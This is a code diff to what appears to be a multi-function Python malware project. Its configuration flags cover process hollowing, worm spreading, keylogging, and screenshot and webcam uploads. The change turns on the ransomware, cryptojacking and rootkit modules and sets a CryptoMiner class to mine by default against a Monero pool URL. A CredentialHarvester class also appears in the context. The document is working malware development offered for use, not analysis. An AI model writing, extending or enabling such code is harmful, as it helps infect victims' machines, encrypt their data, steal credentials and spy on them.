@@ -1358,9 +1358,9 @@ PROCESS_HOLLOWING_ENABLED = True
 DLL_REFLECTIVE_LOADING = True
 POLYMORPHIC = True
 WORM_SPREADING = True
-RANSOMWARE_MODULE = False
-CRYPTOJACKING_MODULE = False
-ROOTKIT_MODULE = False
+RANSOMWARE_MODULE = True
+CRYPTOJACKING_MODULE = True
+ROOTKIT_MODULE = True
 KEYLOGGER_UPLOAD_INTERVAL = 300
 SCREENSHOT_UPLOAD_INTERVAL = 600
 WEBCAM_UPLOAD_INTERVAL = 900
@@ -4121,7 +4121,7 @@ class CredentialHarvester:
 
 class CryptoMiner:
     def __init__(self):
-        self.mining = False
+        self.mining = True
         self.miner_thread = None
         self.hash_rate = 0
         self.pool_url = "stratum+tcp://pool.supportxmr.com:5555"
